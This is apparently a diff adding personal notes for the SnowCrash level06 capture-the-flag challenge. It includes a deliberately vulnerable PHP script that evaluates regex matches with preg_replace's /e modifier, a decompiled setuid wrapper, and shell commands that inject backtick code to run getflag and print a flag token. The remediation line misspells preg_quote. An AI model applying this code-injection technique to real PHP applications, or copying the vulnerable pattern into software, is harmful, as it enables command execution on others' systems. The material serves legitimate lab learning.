@@ -1,0 +1,112 @@
+#!/usr/bin/php
+<?php
+	
+	function y(\$m)
+	{ 
+		\$m = preg_replace("/\./", " x ", \$m);
+		\$m = preg_replace("/@/", " y", \$m);
+		return \$m;
+	}
+	function x(\$y, \$z)
+	{ 
+		\$a = file_get_contents(\$y);
+		\$a = preg_replace("/(\[x (.*)\])/e", "system(\"\\2\")", \$a);
+		\$a = preg_replace("/\[/", "(", \$a);
+		\$a = preg_replace("/\]/", ")", \$a);
+		return \$a; 
+	}
+	\$r = x(\$argv[1], \$argv[2]);
+	print \$r;
+?>
+
+#!/usr/bin/php
+<?php
+	
+	function y($m)
+	{ 
+		$m = preg_replace("/\./", " x ", $m);
+		$m = preg_replace("/@/", " y", $m);
+		return $m;
+	}
+
+	function x($y, $z)
+	{ 
+		$a = file_get_contents($y);
+		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+		$a = preg_replace("/\[/", "(", $a);
+		$a = preg_replace("/\]/", ")", $a);
+		return $a; 
+	}
+	$r = x($argv[1], $argv[2]);
+	print $r;
+?>
+
+.@[]
+x y()
+
+
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  const char **v3; // edi
+  char *v4; // esi
+  char *v5; // ebx
+  __uid_t v7; // [esp-Ch] [ebp-4Ch]
+  __gid_t v8; // [esp+0h] [ebp-40h]
+  char **v9; // [esp+4h] [ebp-3Ch]
+  char *v10[11]; // [esp+14h] [ebp-2Ch] BYREF
+
+  v10[7] = (char *)&argc;
+  v3 = argv;
+  v9 = (char **)envp;
+  v4 = strdup(&s);
+  v5 = strdup(&s);
+  if ( v3[1] )
+  {
+    free(v4);
+    v4 = strdup(v3[1]);
+    if ( v3[2] )
+    {
+      free(v5);
+      v5 = strdup(v3[2]);
+    }
+  }
+  v8 = getegid();
+  v7 = geteuid();
+  setresgid(v8, v8, v8);
+  setresuid(v7, v7, v7);
+  v10[2] = v4;
+  v10[3] = v5;
+  v10[0] = "/usr/bin/php";
+  v10[1] = "/home/user/level06/level06.php";
+  v10[4] = 0;
+  execve("/usr/bin/php", v10, v9);
+  return 0;
+}
+
+
+preg_replace is vulnrable and can cause code execution, should use pgrep_quote instead to quote all malicous characters
+
+findings:
+level06@SnowCrash:~$ echo ' [x $_[n system("/bin/getflag")] ' > /tmp/run && ./level06 /tmp/run 'system("getflag")'
+PHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting ']' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Fatal error:  preg_replace(): Failed evaluating code:
+y("$_[n system(\"/bin/getflag\")") in /home/user/level06/level06.php on line 4
+
+
+
+level06@SnowCrash:~$ echo '[x  $z ]' > /tmp/run && ./level06 /tmp/run 'system("getflag")'
+ system("getflag")
+
+
+
+ evel06@SnowCrash:~$ echo '[x {getflag}]' > /tmp/run && ./level06 /tmp/run
+{getflag}
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/run && ./level06 /tmp/run
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/run && ./level06 /tmp/run
+
+
+flag06 wiok45aaoguiboiki2tuin6ub
